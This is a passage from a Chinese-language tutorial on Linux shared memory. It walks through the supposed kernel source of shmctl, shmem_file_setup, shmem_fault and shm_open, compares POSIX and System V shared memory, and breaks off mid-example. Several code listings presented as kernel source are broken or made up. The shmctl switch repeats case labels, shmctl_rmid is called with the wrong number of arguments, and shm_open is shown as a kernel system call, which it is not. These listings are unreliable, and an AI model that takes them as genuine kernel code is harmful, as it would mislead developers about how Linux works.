    <span class="hljs-keyword">else</span>
        shm_unlock(shp);
    
done:
    up_write(&amp;shm_ids(ns).rwsem);
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>查找 VMA</strong>：根据地址查找对应的 VMA</li>
<li><strong>验证类型</strong>：确保是共享内存映射</li>
<li><strong>取消映射</strong>：调用 <code>do_munmap()</code> 取消内存映射</li>
<li><strong>更新统计</strong>：减少 <code>shm_nattch</code>，更新分离时间</li>
</ol>
<h3 data-id="heading-10">2.6 shmctl() 的实现原理</h3>
<p><strong>shmctl() 的作用</strong>：</p>
<p>控制共享内存段，包括获取信息、设置权限、删除等。</p>
<p><strong>内核实现</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ipc/shm.c</span>
<span class="hljs-type">long</span> <span class="hljs-title function_">ksys_shmctl</span><span class="hljs-params">(<span class="hljs-type">int</span> shmid, <span class="hljs-type">int</span> cmd, <span class="hljs-keyword">struct</span> shmid_ds __user *buf)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmid_kernel</span> *<span class="hljs-title">shp</span>;</span>
    <span class="hljs-type">int</span> err, version;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span>;</span>
    
    ns = current-&gt;nsproxy-&gt;ipc_ns;
    
    <span class="hljs-keyword">if</span> (cmd &lt; <span class="hljs-number">0</span> || shmid &lt; <span class="hljs-number">0</span>)
        <span class="hljs-keyword">return</span> -EINVAL;
    
    <span class="hljs-keyword">switch</span> (cmd) {
    <span class="hljs-keyword">case</span> IPC_INFO:
    <span class="hljs-keyword">case</span> SHM_INFO:
    <span class="hljs-keyword">case</span> SHM_STAT:
    <span class="hljs-keyword">case</span> SHM_STAT_ANY:
        <span class="hljs-comment">// 获取信息</span>
        <span class="hljs-keyword">return</span> shmctl_info(ns, shmid, cmd, buf);
        
    <span class="hljs-keyword">case</span> IPC_STAT:
    <span class="hljs-keyword">case</span> SHM_STAT:
    <span class="hljs-keyword">case</span> SHM_STAT_ANY:
        <span class="hljs-comment">// 获取共享内存段状态</span>
        <span class="hljs-keyword">return</span> shmctl_stat(ns, shmid, cmd, buf);
        
    <span class="hljs-keyword">case</span> IPC_SET:
        <span class="hljs-comment">// 设置共享内存段属性</span>
        <span class="hljs-keyword">return</span> shmctl_set(ns, shmid, cmd, buf);
        
    <span class="hljs-keyword">case</span> IPC_RMID:
        <span class="hljs-comment">// 删除共享内存段</span>
        <span class="hljs-keyword">return</span> shmctl_rmid(ns, shmid, cmd);
        
    <span class="hljs-keyword">case</span> SHM_LOCK:
        <span class="hljs-comment">// 锁定共享内存段（防止交换）</span>
        <span class="hljs-keyword">return</span> shmctl_lock(ns, shmid);
        
    <span class="hljs-keyword">case</span> SHM_UNLOCK:
        <span class="hljs-comment">// 解锁共享内存段</span>
        <span class="hljs-keyword">return</span> shmctl_unlock(ns, shmid);
        
    <span class="hljs-keyword">default</span>:
        <span class="hljs-keyword">return</span> -EINVAL;
    }
}
</code></pre>
<p><strong>IPC_RMID 的实现</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ipc/shm.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">shmctl_rmid</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ipc_namespace *ns, <span class="hljs-type">int</span> shmid)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmid_kernel</span> *<span class="hljs-title">shp</span>;</span>
    
    shp = shm_lock(ns, shmid);
    <span class="hljs-keyword">if</span> (IS_ERR(shp))
        <span class="hljs-keyword">return</span> PTR_ERR(shp);
    
    <span class="hljs-comment">// 1. 检查权限</span>
    <span class="hljs-keyword">if</span> (ns-&gt;shm_rmid_forced ||
        (shp-&gt;shm_perm.mode &amp; SHM_DEST) ||
        (shp-&gt;shm_nattch == <span class="hljs-number">0</span>)) {
        <span class="hljs-comment">// 2. 标记为删除</span>
        do_shm_rmid(ns, &amp;shp-&gt;shm_perm);
        shm_unlock(shp);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 3. 如果还有进程附加，只标记为删除</span>
        shp-&gt;shm_perm.mode |= SHM_DEST;
        ipc_set_key_private(&amp;shm_ids(ns), &amp;shp-&gt;shm_perm);
        shm_unlock(shp);
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>IPC_STAT</strong>：获取共享内存段状态信息</li>
<li><strong>IPC_SET</strong>：设置共享内存段属性（权限、大小等）</li>
<li><strong>IPC_RMID</strong>：删除共享内存段（如果还有进程附加，标记为删除，最后一个进程分离时真正删除）</li>
<li><strong>SHM_LOCK/SHM_UNLOCK</strong>：锁定/解锁共享内存段，防止交换到磁盘</li>
</ol>
<hr/>
<h2 data-id="heading-11">3. 底层实现原理</h2>
<h3 data-id="heading-12">3.1 数据结构</h3>
<p><strong>shmid_kernel 结构</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ipc/shm.c</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmid_kernel</span> /* <span class="hljs-title">private</span> <span class="hljs-title">to</span> <span class="hljs-title">the</span> <span class="hljs-title">kernel</span> */
{</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kern_ipc_perm</span>  <span class="hljs-title">shm_perm</span>;</span>  <span class="hljs-comment">// IPC 权限结构</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span>          *<span class="hljs-title">shm_file</span>;</span>   <span class="hljs-comment">// 指向 tmpfs 文件的指针</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>        shm_nattch;  <span class="hljs-comment">// 附加计数</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>        shm_segsz;   <span class="hljs-comment">// 段大小</span>
    <span class="hljs-type">time64_t</span>             shm_atim;    <span class="hljs-comment">// 最后附加时间</span>
    <span class="hljs-type">time64_t</span>             shm_dtim;    <span class="hljs-comment">// 最后分离时间</span>
    <span class="hljs-type">time64_t</span>             shm_ctim;    <span class="hljs-comment">// 最后修改时间</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span>           *<span class="hljs-title">shm_cprid</span>;</span>  <span class="hljs-comment">// 创建进程 ID</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span>           *<span class="hljs-title">shm_lprid</span>;</span>  <span class="hljs-comment">// 最后附加进程 ID</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ucounts</span>       *<span class="hljs-title">mlock_ucounts</span>;</span>  <span class="hljs-comment">// 锁定计数</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span>   *<span class="hljs-title">shm_creator</span>;</span>     <span class="hljs-comment">// 创建进程</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span>     <span class="hljs-title">shm_clist</span>;</span>        <span class="hljs-comment">// 创建者列表</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span>;</span>              <span class="hljs-comment">// IPC 命名空间</span>
};
</code></pre>
<p><strong>shm_file_data 结构</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ipc/shm.c</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shm_file_data</span> {</span>
    <span class="hljs-type">int</span> id;                              <span class="hljs-comment">// 共享内存 ID</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span>;</span>            <span class="hljs-comment">// IPC 命名空间</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span>                   <span class="hljs-comment">// 底层文件</span>
    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_operations_struct</span> *<span class="hljs-title">vm_ops</span>;</span>  <span class="hljs-comment">// 原始 vm_ops</span>
};
</code></pre>
<p><strong>关键字段说明</strong>：</p>
<ol>
<li>
<p><strong>shm_perm</strong>：</p>
<ul>
<li><strong>作用</strong>：IPC 权限和标识</li>
<li><strong>包含</strong>：key、ID、权限、所有者等</li>
</ul>
</li>
<li>
<p><strong>shm_file</strong>：</p>
<ul>
<li><strong>作用</strong>：指向 tmpfs 文件的指针</li>
<li><strong>类型</strong>：<code>struct file *</code></li>
<li><strong>作用</strong>：共享内存段实际上是一个 tmpfs 文件</li>
</ul>
</li>
<li>
<p><strong>shm_nattch</strong>：</p>
<ul>
<li><strong>作用</strong>：当前附加到该段的进程数</li>
<li><strong>更新</strong>：每次 <code>shmat()</code> 时增加，<code>shmdt()</code> 时减少</li>
</ul>
</li>
<li>
<p><strong>shm_segsz</strong>：</p>
<ul>
<li><strong>作用</strong>：共享内存段的大小（字节）</li>
<li><strong>限制</strong>：受 <code>shm_ctlmax</code> 限制</li>
</ul>
</li>
</ol>
<h3 data-id="heading-13">3.2 tmpfs 文件系统</h3>
<p><strong>tmpfs 的作用</strong>：</p>
<p>System V 共享内存段实际上是在 tmpfs 文件系统中创建的文件。tmpfs 是一个基于内存的文件系统，数据存储在 RAM 中。</p>
<p><strong>tmpfs 的特点</strong>：</p>
<ol>
<li><strong>内存存储</strong>：数据存储在 RAM 中，访问速度快</li>
<li><strong>可交换</strong>：如果内存不足，可以交换到交换分区</li>
<li><strong>临时性</strong>：系统重启后数据丢失</li>
<li><strong>动态大小</strong>：可以根据需要动态增长</li>
</ol>
<p><strong>shmem_file_setup() 函数</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/shmem.c</span>
<span class="hljs-keyword">struct</span> file *<span class="hljs-title function_">shmem_file_setup</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name, <span class="hljs-type">loff_t</span> size, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags)</span>
{
    <span class="hljs-type">int</span> error;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dentry</span> *<span class="hljs-title">dentry</span>, *<span class="hljs-title">root</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">qstr</span> <span class="hljs-title">this</span>;</span>
    
    <span class="hljs-comment">// 1. 获取 tmpfs 挂载点</span>
    root = shm_mnt-&gt;mnt_root;
    
    <span class="hljs-comment">// 2. 创建 dentry</span>
    this.name = name;
    this.len = <span class="hljs-built_in">strlen</span>(name);
    this.hash = <span class="hljs-number">0</span>;
    dentry = d_alloc(root, &amp;this);
    <span class="hljs-keyword">if</span> (!dentry)
        <span class="hljs-keyword">return</span> ERR_PTR(-ENOMEM);
    
    <span class="hljs-comment">// 3. 创建 inode</span>
    inode = shmem_get_inode(root-&gt;d_sb, <span class="hljs-literal">NULL</span>, S_IFREG | S_IRWXUGO, <span class="hljs-number">0</span>, flags);
    <span class="hljs-keyword">if</span> (!inode) {
        dput(dentry);
        <span class="hljs-keyword">return</span> ERR_PTR(-ENOMEM);
    }
    
    <span class="hljs-comment">// 4. 设置文件大小</span>
    inode-&gt;i_size = size;
    d_instantiate(dentry, inode);
    inode-&gt;i_nlink = <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// 5. 创建文件</span>
    file = alloc_file_pseudo(inode, shm_mnt, dentry-&gt;d_name.name,
                              O_RDWR | (flags &amp; O_ACCMODE),
                              &amp;shmem_file_operations);
    
    <span class="hljs-keyword">return</span> file;
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>文件创建</strong>：在 tmpfs 中创建文件</li>
<li><strong>大小设置</strong>：设置文件大小为共享内存段大小</li>
<li><strong>文件操作</strong>：使用 <code>shmem_file_operations</code> 作为文件操作函数</li>
</ol>
<h3 data-id="heading-14">3.3 内存映射机制</h3>
<p><strong>mmap() 的作用</strong>：</p>
<p>将文件映射到进程地址空间，实现共享内存的访问。</p>
<p><strong>映射流程</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 进程调用 shmat()
   ↓
<span class="hljs-bullet">2.</span> 内核调用 do<span class="hljs-emphasis">_mmap_</span>pgoff()
   ↓
<span class="hljs-bullet">3.</span> 创建 VMA（虚拟内存区域）
   ↓
<span class="hljs-bullet">4.</span> 设置 VMA 属性（地址、大小、权限等）
   ↓
<span class="hljs-bullet">5.</span> 将 VMA 添加到进程的 mm<span class="hljs-emphasis">_struct
   ↓
6. 返回虚拟地址
</span></code></pre>
<p><strong>VMA 结构</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// include/linux/mm_types.h</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> {</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> vm_start;      <span class="hljs-comment">// 起始地址</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> vm_end;        <span class="hljs-comment">// 结束地址</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">vm_mm</span>;</span>     <span class="hljs-comment">// 所属进程</span>
    <span class="hljs-type">pgprot_t</span> vm_page_prot;       <span class="hljs-comment">// 页面保护</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> vm_flags;      <span class="hljs-comment">// 标志（MAP_SHARED 等）</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">vm_file</span>;</span>        <span class="hljs-comment">// 映射的文件</span>
    <span class="hljs-type">void</span> *vm_private_data;       <span class="hljs-comment">// 私有数据</span>
    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_operations_struct</span> *<span class="hljs-title">vm_ops</span>;</span>  <span class="hljs-comment">// 操作函数</span>
    <span class="hljs-comment">// ...</span>
};
</code></pre>
<p><strong>页面错误处理</strong>：</p>
<p>当进程访问共享内存时，如果页面不在内存中，会触发页面错误：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/shmem.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">vm_fault_t</span> <span class="hljs-title function_">shmem_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_fault *vmf)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> vmf-&gt;vma;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span> =</span> file_inode(vma-&gt;vm_file);
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span>
    <span class="hljs-type">vm_fault_t</span> ret = VM_FAULT_LOCKED;
    
    <span class="hljs-comment">// 1. 获取页面</span>
    page = shmem_getpage_gfp(inode, vmf-&gt;pgoff, &amp;vmf-&gt;page,
                              SGP_CACHE, vmf-&gt;gfp_mask, vma, vmf, <span class="hljs-literal">NULL</span>);
    
    <span class="hljs-keyword">if</span> (!page)
        <span class="hljs-keyword">return</span> VM_FAULT_OOM;
    
    <span class="hljs-comment">// 2. 如果页面在交换分区，需要换入</span>
    <span class="hljs-keyword">if</span> (PageSwapCache(page)) {
        swap_readpage(page, <span class="hljs-literal">true</span>);
        wait_on_page_locked(page);
    }
    
    <span class="hljs-keyword">return</span> ret;
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>延迟分配</strong>：页面在首次访问时才分配</li>
<li><strong>交换支持</strong>：如果内存不足，页面可以交换到交换分区</li>
<li><strong>写时复制</strong>：如果使用 <code>MAP_PRIVATE</code>，会使用写时复制</li>
</ol>
<h3 data-id="heading-15">3.4 同步机制</h3>
<p><strong>为什么需要同步</strong>：</p>
<p>多个进程访问共享内存时，需要同步机制来避免竞争条件。</p>
<p><strong>常见的同步机制</strong>：</p>
<ol>
<li>
<p><strong>信号量（Semaphore）</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span>

<span class="hljs-comment">// 创建信号量</span>
<span class="hljs-type">int</span> semid = semget(key, <span class="hljs-number">1</span>, IPC_CREAT | <span class="hljs-number">0666</span>);

<span class="hljs-comment">// P 操作（等待）</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sembuf</span> <span class="hljs-title">sop</span> =</span> {<span class="hljs-number">0</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>};
semop(semid, &amp;sop, <span class="hljs-number">1</span>);

<span class="hljs-comment">// V 操作（释放）</span>
sop.sem_op = <span class="hljs-number">1</span>;
semop(semid, &amp;sop, <span class="hljs-number">1</span>);
</code></pre>
</li>
<li>
<p><strong>互斥锁（Mutex）</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span>

<span class="hljs-comment">// 在共享内存中创建互斥锁</span>
<span class="hljs-type">pthread_mutex_t</span> *mutex = (<span class="hljs-type">pthread_mutex_t</span> *)shm_addr;
<span class="hljs-type">pthread_mutexattr_t</span> attr;
pthread_mutexattr_init(&amp;attr);
pthread_mutexattr_setpshared(&amp;attr, PTHREAD_PROCESS_SHARED);
pthread_mutex_init(mutex, &amp;attr);

<span class="hljs-comment">// 使用</span>
pthread_mutex_lock(mutex);
<span class="hljs-comment">// 临界区</span>
pthread_mutex_unlock(mutex);
</code></pre>
</li>
<li>
<p><strong>条件变量（Condition Variable）</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span>

<span class="hljs-type">pthread_cond_t</span> *cond = (<span class="hljs-type">pthread_cond_t</span> *)shm_addr;
<span class="hljs-type">pthread_condattr_t</span> attr;
pthread_condattr_init(&amp;attr);
pthread_condattr_setpshared(&amp;attr, PTHREAD_PROCESS_SHARED);
pthread_cond_init(cond, &amp;attr);

<span class="hljs-comment">// 等待</span>
pthread_cond_wait(cond, mutex);

<span class="hljs-comment">// 通知</span>
pthread_cond_signal(cond);
</code></pre>
</li>
</ol>
<hr/>
<h2 data-id="heading-16">4. POSIX 共享内存</h2>
<h3 data-id="heading-17">4.1 POSIX 共享内存 API</h3>
<p><strong>核心函数</strong>：</p>
<ol>
<li><strong><code>shm_open()</code></strong>：创建或打开共享内存对象</li>
<li><strong><code>shm_unlink()</code></strong>：删除共享内存对象</li>
<li><strong><code>mmap()</code></strong>：映射共享内存到进程地址空间</li>
<li><strong><code>munmap()</code></strong>：取消映射</li>
</ol>
<p><strong>函数原型</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span>

<span class="hljs-comment">// 创建或打开共享内存对象</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">shm_open</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name, <span class="hljs-type">int</span> oflag, <span class="hljs-type">mode_t</span> mode)</span>;

<span class="hljs-comment">// 删除共享内存对象</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">shm_unlink</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span>;

<span class="hljs-comment">// 映射共享内存</span>
<span class="hljs-type">void</span> *<span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> prot, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)</span>;

<span class="hljs-comment">// 取消映射</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">munmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> length)</span>;
</code></pre>
<h3 data-id="heading-18">4.2 shm_open() 的实现原理</h3>
<p><strong>shm_open() 的作用</strong>：</p>
<p>在 <code>/dev/shm</code> 目录下创建或打开共享内存文件。</p>
<p><strong>内核实现</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/shmem.c</span>
SYSCALL_DEFINE3(shm_open, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, name, <span class="hljs-type">int</span>, oflag, <span class="hljs-type">umode_t</span>, mode)
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">path</span> <span class="hljs-title">path</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span>
    <span class="hljs-type">int</span> err;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> lookup_flags = LOOKUP_FOLLOW | LOOKUP_DIRECTORY;
    
    <span class="hljs-keyword">if</span> (oflag &amp; ~(O_CREAT | O_RDWR | O_TRUNC | O_EXCL | O_CLOEXEC))
        <span class="hljs-keyword">return</span> -EINVAL;
    
    <span class="hljs-keyword">if</span> (oflag &amp; O_CREAT) {
        <span class="hljs-keyword">if</span> (oflag &amp; O_EXCL)
            lookup_flags |= LOOKUP_EXCL;
        lookup_flags |= LOOKUP_CREATE;
    }
    
    <span class="hljs-comment">// 1. 在 /dev/shm 中查找或创建文件</span>
    err = user_path_create(AT_FDCWD, name, &amp;path, lookup_flags);
    <span class="hljs-keyword">if</span> (err)
        <span class="hljs-keyword">return</span> err;
    
    <span class="hljs-comment">// 2. 打开文件</span>
    file = dentry_open(&amp;path, oflag, current_cred());
    path_put(&amp;path);
    
    <span class="hljs-keyword">if</span> (IS_ERR(file))
        <span class="hljs-keyword">return</span> PTR_ERR(file);
    
    <span class="hljs-comment">// 3. 设置文件大小（如果是新创建的文件）</span>
    <span class="hljs-keyword">if</span> (oflag &amp; O_CREAT) {
        <span class="hljs-keyword">if</span> (oflag &amp; O_TRUNC) {
            err = do_ftruncate(file, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
            <span class="hljs-keyword">if</span> (err)
                <span class="hljs-keyword">goto</span> out;
        }
    }
    
    <span class="hljs-comment">// 4. 返回文件描述符</span>
    <span class="hljs-keyword">return</span> fd_install(fd, file);
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>文件位置</strong>：在 <code>/dev/shm</code> 目录下创建文件</li>
<li><strong>文件系统</strong>：使用 tmpfs 文件系统</li>
<li><strong>文件描述符</strong>：返回文件描述符，可以用于 <code>mmap()</code></li>
</ol>
<h3 data-id="heading-19">4.3 POSIX vs System V 共享内存</h3>













































<table><thead><tr><th>特性</th><th>System V</th><th>POSIX</th></tr></thead><tbody><tr><td><strong>标识方式</strong></td><td>key_t key</td><td>文件名</td></tr><tr><td><strong>标准</strong></td><td>System V IPC</td><td>POSIX</td></tr><tr><td><strong>API</strong></td><td>shmget/shmat/shmdt</td><td>shm_open/mmap/munmap</td></tr><tr><td><strong>文件系统</strong></td><td>tmpfs（内核内部）</td><td>tmpfs（/dev/shm）</td></tr><tr><td><strong>权限</strong></td><td>IPC 权限</td><td>文件系统权限</td></tr><tr><td><strong>删除</strong></td><td>shmctl(IPC_RMID)</td><td>shm_unlink()</td></tr><tr><td><strong>可移植性</strong></td><td>较低</td><td>较高</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-20">5. 使用示例</h2>
<h3 data-id="heading-21">5.1 System V 共享内存示例</h3>
<p><strong>创建共享内存的进程</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/shm.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> SHM_SIZE 1024</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> SHM_KEY 1234</span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    <span class="hljs-type">int</span> shmid;
    <span class="hljs-type">char</span> *shm_addr;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sembuf</span> <span class="hljs-title">sop</span>;</span>
    <span class="hljs-type">int</span> semid;
    
    <span class="hljs-comment">// 1. 创建信号量</span>
    semid = semget(SHM_KEY, <span class="hljs-number">1</span>, IPC_CREAT | <span class="hljs-number">0666</span>);
    <span class="hljs-keyword">if</span> (semid &lt; <span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">"semget"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    
    <span class="hljs-comment">// 初始化信号量为 1</span>
    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">semun</span> {</span>
        <span class="hljs-type">int</span> val;
        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">semid_ds</span> *<span class="hljs-title">buf</span>;</span>
        <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> *<span class="hljs-built_in">array</span>;
    } arg;
    arg.val = <span class="hljs-number">1</span>;
    semctl(semid, <span class="hljs-number">0</span>, SETVAL, arg);
    
    <span class="hljs-comment">// 2. 创建共享内存</span>
    shmid = shmget(SHM_KEY, SHM_SIZE, IPC_CREAT | <span class="hljs-number">0666</span>);
    <span class="hljs-keyword">if</span> (shmid &lt; <span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">"shmget"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    
    <span class="hljs-comment">// 3. 附加共享内存</span>
    shm_addr = (<span class="hljs-type">char</span> *)shmat(shmid, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);
    <span class="hljs-keyword">if</span> (shm_addr == (<span class="hljs-type">char</span> *)<span class="hljs-number">-1</span>) {
        perror(<span class="hljs-string">"shmat"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    
    <span class="hljs-comment">// 4. 写入数据</span>
    <span class="hljs-built_in">strcpy</span>(shm_addr, <span class="hljs-string">"Hello, Shared Memory!"</span>);
    
    <span class="hljs-comment">// 5. 等待其他进程读取</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Data written. Waiting for reader...\n"</span>);
    sleep(<span class="hljs-number">10</span>);
    
    <span class="hljs-comment">// 6. 分离共享内存</span>
    shmdt(shm_addr);
    
    <span class="hljs-comment">// 7. 删除共享内存</span>
    shmctl(shmid, IPC_RMID, <span class="hljs-literal">NULL</span>);
    semctl(semid, <span class="hljs-number">0</span>, IPC_RMID);
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>读取共享内存的进程</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/shm.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> SHM_SIZE 1024</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> SHM_KEY 1234</span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    <span class="hljs-type">int</span> shmid;
    <span class="hljs-type">char</span> *shm_addr;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sembuf</span> <span class="hljs-title">sop</span>;</span>
    <span class="hljs-type">int</span> semid;
    
    <span class="hljs-comment">// 1. 获取信号量</span>
